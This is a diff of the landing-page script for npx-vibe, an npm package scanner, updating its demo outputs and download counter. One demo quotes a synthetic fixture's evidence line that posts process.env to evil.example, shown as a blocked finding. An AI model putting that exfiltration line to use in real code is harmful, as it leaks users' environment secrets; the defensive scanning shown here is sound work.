@@ -1,9 +1,9 @@
 const demos = {
-  approve: `$ npx npx-vibe approve-scripts
+  approve: `$ npx npx-vibe@3.0.0 approve-scripts
 ! npx-vibe approve-scripts: 2 need review
 my-app@1.0.0
 
-Dependencies with install scripts: 4  Already allowed: 2
+Dependencies with install scripts: 4  Already allowed: 2  Already denied: 0
 Reviewed now: 2  approve 0  review 2  deny 0
 
 REVIEW   better-sqlite3@11.10.0
@@ -21,24 +21,23 @@ REVIEW   esbuild@0.28.2
 No install script was executed during this review.
 2 package(s) need a human decision; --write never records those.`,
 
-  scan: `$ npx npx-vibe vite
-npx-vibe: Proceed  risk 5/100
-vite@7.1.7
-Native-ESM powered web dev build tool
+  scan: `$ npx npx-vibe@3.0.0 is-number@7.0.0
+✓ npx-vibe: Proceed  risk 0/100
+is-number@7.0.0
+Returns true if a number or string value is a finite number.
 
-Downloads: 38,410,225/week  Package age: 2331d  Version age: 10d
 Known advisories: none found (OSV)
 Install hooks: none
-Inspected: 4 selected files from 36 package files
+Inspected: 1 selected file from 4 package files
 Established signals: long registry history, high weekly adoption,
 linked GitHub repository
 
-Registry context (not scored):
-- young_version: This version was published 10 days ago.
+AI review: skipped (No heuristic trigger required model review.)
 
-Action: nothing blocking found. Run it with: npx-vibe run vite`,
+Action: nothing blocking found. No runnable binary was selected;
+this was a read-only scan.`,
 
-  advisory: `$ npx npx-vibe lodash@4.17.15
+  advisory: `$ npx npx-vibe@3.0.0 lodash@4.17.15
 ! npx-vibe: Caution  risk 55/100
 lodash@4.17.15
 
@@ -54,10 +53,10 @@ Findings:
 
 Action: read the evidence above before running this package.`,
 
-  agent: `$ npx npx-vibe --agent esbuild
+  agent: `$ npx npx-vibe@3.0.0 --agent esbuild@0.28.2
 {
-  "schemaVersion": 2,
-  "tool": { "name": "npx-vibe", "version": "2.0.0" },
+  "schemaVersion": 3,
+  "tool": { "name": "npx-vibe", "version": "3.0.0" },
   "kind": "package-scan",
   "status": "complete",
   "decision": {
@@ -66,14 +65,37 @@ Action: read the evidence above before running this package.`,
     "action": "review",
     "exitCode": 2,
     "mayContinue": false,
-    "safeToExecute": false,
     "requiresApproval": true,
     "blocked": false,
     "mustStop": false
+  },
+  "coverage": {
+    "scope": "package", "complete": true,
+    "requested": 1, "scanned": 1,
+    "skipped": 0, "failed": 0, "reasons": []
   }
 }`,
 
-  block: `$ npx npx-vibe sketchy-package
+  incomplete: `$ npx npx-vibe@3.0.0 project --agent
+{
+  "schemaVersion": 3,
+  "kind": "project-scan",
+  "status": "incomplete",
+  "decision": {
+    "action": "retry", "exitCode": 1,
+    "mayContinue": false, "mustStop": true
+  },
+  "coverage": {
+    "scope": "dependency-tree", "complete": false,
+    "requested": 2, "scanned": 1,
+    "skipped": 1, "failed": 0,
+    "reasons": ["local: Workspace/local links are outside the registry-only trust boundary."]
+  }
+}
+
+A clean scanned subset is not permission to continue.`,
+
+  block: `$ npx npx-vibe@3.0.0 sketchy-package
 npx-vibe: Block  risk 100/100
 fixture: install-time secret exfiltration
 
@@ -86,15 +108,16 @@ Findings:
   Evidence line 1: fetch("https://evil.example/collect",
   { method: "POST", body: JSON.stringify(process.env) })
 
-Action: blocked. npx-vibe run sketchy-package --force
+Action: blocked. npx-vibe run --force sketchy-package
 overrides this deliberately.`
 };
 
 const demoMeta = {
-  approve: "npm 12 blocks install scripts until you allow them. This is the review that tells you which ones deserve it, with the source line behind each decision.",
-  scan: "The default command reviews and exits. Age and adoption are shown as context and never move the score.",
+  approve: "Illustrative project output with verified esbuild evidence. --write records only unambiguous, version-pinned decisions; no install script runs.",
+  scan: "Abbreviated real scan of is-number@7.0.0, checked October 2, 2026. Source selection is bounded; Proceed is not proof of safety.",
   advisory: "Known advisories come from OSV with no API key. A published CVE raises Caution; it never forces a Block on its own.",
-  agent: "Agent mode returns schema-versioned JSON, disables local history writes, and pauses the workflow on Caution.",
+  agent: "Abbreviated schema 3 result from esbuild@0.28.2. Agent mode is read-only; coverage counts subjects, not all source files.",
+  incomplete: "Illustrative partial project review. A skipped dependency makes coverage incomplete and requires retry, even if the scanned package is clean.",
   block: "A synthetic fixture. Critical findings require the secret read and the network call to sit on the same code path.",
 };
 
@@ -146,7 +169,7 @@ tabs.forEach((tab, index) => {
   });
 });
 
-setDemo("proceed");
+setDemo("approve");
 
 const siteHeader = document.querySelector(".site-header");
 
@@ -197,18 +220,7 @@ document.querySelectorAll("[data-copy]").forEach((button) => {
   });
 });
 
-// The named windows (last-week, last-month) lag several days behind, so the
-// counter read as stale even though it was live. An explicit date range returns
-// the recent days, and we sum the most recent seven that actually have data.
-const DOWNLOAD_RANGE_DAYS = 14;
-
-function downloadsUrl() {
-  const day = 86400000;
-  const iso = (date) => date.toISOString().slice(0, 10);
-  const end = new Date(Date.now());
-  const start = new Date(end.getTime() - DOWNLOAD_RANGE_DAYS * day);
-  return `https://api.npmjs.org/downloads/range/${iso(start)}:${iso(end)}/npx-vibe`;
-}
+// Show npm's official last-week reporting window without dropping zero days.
 const numberFormatter = new Intl.NumberFormat("en-US");
 
 function animateNumber(element, total) {
@@ -258,7 +270,7 @@ async function fetchJson(url, timeoutMs) {
 }
 
 function applyTotal(total, from, to) {
-  if (!total) return false;
+  if (!Number.isFinite(total) || total < 0) return false;
   document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
     animateNumber(element, total);
     element.setAttribute(
@@ -269,28 +281,16 @@ function applyTotal(total, from, to) {
   return true;
 }
 
-async function refreshDownloads() {
-  // Preferred: an explicit range, because npm's named windows lag several days.
-  try {
-    const payload = await fetchJson(downloadsUrl(), 12000);
-    const days = Array.isArray(payload.downloads) ? payload.downloads : [];
-    const counted = [...days];
-    // Trailing zero days are "not counted yet" rather than a real zero.
-    while (counted.length && Number(counted[counted.length - 1].downloads || 0) === 0) {
-      counted.pop();
-    }
-    const week = counted.slice(-7);
-    const total = week.reduce((sum, day) => sum + Number(day.downloads || 0), 0);
-    if (applyTotal(total, week[0]?.day, week[week.length - 1]?.day)) return;
-  } catch (error) {
-    console.warn("Range download lookup failed, falling back:", error.message);
-  }
 
-  // Fallback: the named window. Older data, but better than a placeholder.
+async function refreshDownloads() {
   try {
-    const payload = await fetchJson("https://api.npmjs.org/downloads/point/last-week/npx-vibe", 8000);
-    applyTotal(Number(payload.downloads || 0), payload.start, payload.end);
+    const payload = await fetchJson("https://api.npmjs.org/downloads/point/last-week/npx-vibe", 12000);
+    if (!applyTotal(Number(payload.downloads), payload.start, payload.end)) throw new Error("Invalid download total");
   } catch (error) {
+    document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
+      element.textContent = "—";
+      element.setAttribute("title", "npm download statistics are currently unavailable");
+    });
     console.warn("Could not refresh npm download count:", error.message);
   }
 }
